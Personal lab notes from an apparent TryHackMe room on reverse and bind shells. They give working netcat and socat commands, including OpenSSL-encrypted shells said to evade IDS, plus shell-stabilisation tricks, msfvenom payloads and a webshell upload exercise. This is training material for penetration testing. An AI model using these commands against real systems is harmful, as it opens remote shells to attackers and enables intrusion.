# What the Shell! (Reverse/Bind Shells)

Michael Bailey | 7/23/21

This room goes over some basic shells

You can also find more at [revshells](https://revshells.com) or on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

## Types of Shells

- Reverse shells are when the target is forced to execute code that connects back to the attack machine, which would be running something like Netcat to receive the connection. Usually there are also some network needs, but THM has those automatically set up
- Bind shells are when the code executed on the target is used to start a listener attached to the shell directly on the target. This opens up the ability to connect via the internet. Working out the network is easier with this method but certain firewall rules may prevent it

Reverse shells tend to be easier and slightly more reliable.

The following examples need to be ran in the exact order listed

Basic reverse shell (Unix as example, can work on Windows as well):
**Attacker**: `sudo nc -lvnp <port>`
**Target**: `nc [attacker_ip] [attacker_nc_port] -e /bin/bash`

Basic bind shell (using Windows just as an example, can be used on Unix as well):
**Target**: `nc -lvnp <port> -e "cmd.exe"`
**Attacker**: `nc [target_ip] [target_nc_port]`

Most reverse/bind shells aren't interactive, while others like SSH are. Non-interactive shells can only reliably run commands that just output text, nothing like ssh or something that takes user input.

`alias listener="sudo rlwrap nc -lvnp 443"` - alias for some examples in this room

## Stabilizing Netcat-based Shells

- On Linux, we can use python
  - First run `python(2|3 if need be) -c 'import pty;pty.spawn("/bin/bash")'` on the target, which will give a better shell
  - Then run `export TERM=xterm` which will give us commands like `clear`
  - Then `Ctrl-Z` and then run `stty raw -echo; fg` which will allow us to use `Ctrl-C` and use more interactive things like ssh. Exit the shell with `exit`
  - If it messes up or the shell dies, then `reset` will help 

- Another method is using the `rlwrap` program. This allows us to have a more stabilized shell right out the gate, and works for Windows and Unix
  - To use `Ctrl-C` in the spawned shell (Linux only), use the `Ctrl-Z` then `stty raw -echo; fg` technique from before

- Another method is to use `socat`, which is an initial Netcat shell (only more stable on Linux). You would host a webserver with [a precompiled `socat` binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat) in it on the attacking machine then use curl/wget on the target machine to bring it in
  - Socat just connects two points. It can be used like Netcat but it can also take in files or other ports as input as well
  - Reverse Unstable
    - Attacker: `socat TCP-L:<port> -` (=== `nc -lvnp <port>`)
    - Target:
      - Windows: `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`
      - Linux: `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`
  - Bind Unstable
    - Target:  
      - Windows: `socat TCP-L:<PORT> EXEC:powershell.exe,pipes`
      - Linux: `socat TCP-L:<PORT> EXEC:"bash -li"`
    - Attacker: `socat TCP:<TARGET-IP>:<TARGET-PORT> -`
  - Linux Reverse Stable
    - Attacker: ```socat TCP-L:<port> FILE:`tty`,raw,echo=0```
    - Target: `socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`
  - Using `-d -d` will increase the verbosity if errors occur 

> Attacker: Let's break this command down into its two parts. As usual, we're connecting two points together. In this case those points are a listening port, and a file. Specifically, we are allocating a new tty, and setting the echo to be zero. This is approximately equivalent to using the Ctrl + Z, stty raw -echo; fg trick with a netcat shell -- with the added bonus of being immediately stable and allocating a full tty.
> 
> Target: This is a handful, so let's break it down.
>
>The first part is easy -- we're linking up with the listener running on our own machine. The second part of the command creates an interactive bash session with  EXEC:"bash -li". We're also passing the arguments: pty, stderr, sigint, setsid and sane:
>
>    pty, allocates a pseudoterminal on the target -- part of the stabilisation process
> 
>    stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
> 
>    sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
> 
>    setsid, creates the process in a new session
> 
>    sane, stabilises the terminal, attempting to "normalise" it.

- To change the number of cols/rows in the reverse/bind shell, run `stty -a` on the attacking machine then use `stty <rows|cols> #` on the reverse or bind shell

- Socat can also create encrypted shells, which can't be spied on unless you have a decryption key. They can also bypass IDS as a result
  - Essentially, TCP gets replaced with OPENSSL
  - Generate a cert: `openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`
  - Merge the two created files into a pem file: `cat shell.key shell.crt > shell.pem`
  - Reverse shell listener: `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -` (verify=0 says not to validate the cert signature)
  - Reverse shell target: `socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`
  - Bind shell target: `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`
  - Bind shell listener: `socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`
    - Windows requires the bind shell target requires the pem file, so a way would need to be found to use the cert on the victim machine

- What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem"

```
socat OPENSSL-LISTEN:53 FILE:`tcp`,raw,echo=0,cert=encrypt.pem,verify=0 -
```

- If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?

```
socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

It's common to use other payloads in order to start shells since `nc -e` won't work everywhere. The links I posted above have a literal shit ton of examples in different languages, shells, and other tools

Metasploit offers `msfvenom`, which creates an executable to be ran on the target machine (for both reverse shells and bind shells)

- Staged payloads are sent in two executables. The first is put on the machine, and when ran, downloads the second executable which is then ran
- Stageless payloads do it all in one step. It's more common and easier to use but are also easier to detect
- Both, currently, can be caught, though the staged payload may get through shitty or misconfigured antivirus software

For the Metasploit shells, it uses `meterpreter`, which are fully stable shells that interact with the target machine

Metaploit's `multi/handler` is good for catching reverse shells, usually used in tandem with meterpreter

Webshells are shells you upload to a web server taking files and navigating to them if possible

## Practice

- Try uploading a webshell to the Linux box, then use the command: `nc <LOCAL-IP> <PORT> -e /bin/bash` to send a reverse shell back to a waiting listener on your own machine.
  - In the Webshells section, it recommends `/usr/share/webshells/php/php-reverse-shell.php`
